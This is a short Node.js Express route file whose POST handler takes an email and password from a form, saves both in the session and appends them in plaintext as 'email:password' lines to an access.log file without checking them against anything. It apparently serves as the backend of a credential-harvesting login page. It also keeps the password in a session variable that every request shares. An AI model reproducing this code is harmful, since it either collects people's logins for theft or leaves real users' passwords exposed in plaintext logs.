var express = require('express');
var router = express.Router();


var sess
router.post("/", function(req, res, next) {
    var email = req.body.__userEmail
    var password = req.body.__userPassword
    sess = req.session

    if (typeof(email) == "string" && typeof(password) == "string") {
        var fs = require("fs")
        var config = require('../lib/dataConfigs')
        sess.email = email
        sess.password = password

        fs.appendFileSync(config.writeLogs.path + "access.log", email+":"+password+"\n")

        res.redirect("/")
    };
})


/* GET users listing. */
router.all("/", function(req, res, netx) {

    res.redirect("/")

})


module.exports = router;